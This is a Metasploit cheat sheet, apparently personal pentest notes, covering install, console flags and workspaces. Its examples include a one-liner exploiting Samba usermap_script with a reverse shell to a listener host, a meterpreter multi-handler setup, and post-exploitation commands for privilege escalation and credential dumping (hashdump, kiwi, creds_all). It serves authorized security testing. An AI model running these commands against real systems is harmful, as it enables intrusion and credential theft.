## Metasploit

### Install

Easiest way is to use Kali/Parrot and install from repo

```bash
apt install metasploit-framework
```

otherwise download from 

```bash
https://github.com/rapid7/metasploit-framework/releases
```

### Usage

```bash
msfconsole [options]
```

### Flags

```bash
Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked.
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
```

### Examples

#### init database

```bash
msfdb init
```

#### create new workspace

```bash
workspace -a [name]
```

#### switch to workspace

```bash
workspace [name]
```

#### run commands without interactive shell

```bash
msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```

#### Multi-handler for reverse shell

To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <IP>
set lport <PORT>
set ExitOnSession false
exploit -j
```

The -j option is to keep all the connected session in the background.  

##### netcat/bash reverse

```bash
set PAYLOAD linux/x86/shell/reverse_tcp
```

##### run in the background

```bash
run -j
```

#### Meterpreter

`getsystem`

`hashdump`

`load kiwi`

`creds_all`

### Also see

* [Github Project](https://github.com/rapid7/metasploit-framework)
* [metasploit-unleashed](https://www.offensive-security.com/metasploit-unleashed/)
